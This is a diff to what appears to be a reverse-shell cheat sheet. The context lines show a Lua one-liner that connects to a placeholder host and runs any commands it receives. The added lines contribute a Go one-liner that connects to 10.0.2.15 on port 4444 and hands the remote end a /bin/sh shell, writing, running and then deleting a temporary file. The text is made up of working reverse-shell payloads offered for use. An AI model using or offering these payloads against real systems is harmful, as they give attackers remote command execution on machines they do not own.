@@ -173,6 +173,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ╠════════════╩══════╦═══════════════════════════════
 ║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ╚═══════════════════╩═══════════════════════════════
+
+╔GOLANG══════╦══════════════════════════════════════
+║ Linux only ║ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.2.15:4444");m:=exec.Command("/bin/sh");m.Stdin=c;m.Stdout=c;m.Stderr=c;m.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+╚════════════╩══════════════════════════════════════
 ```
 
 # TODO
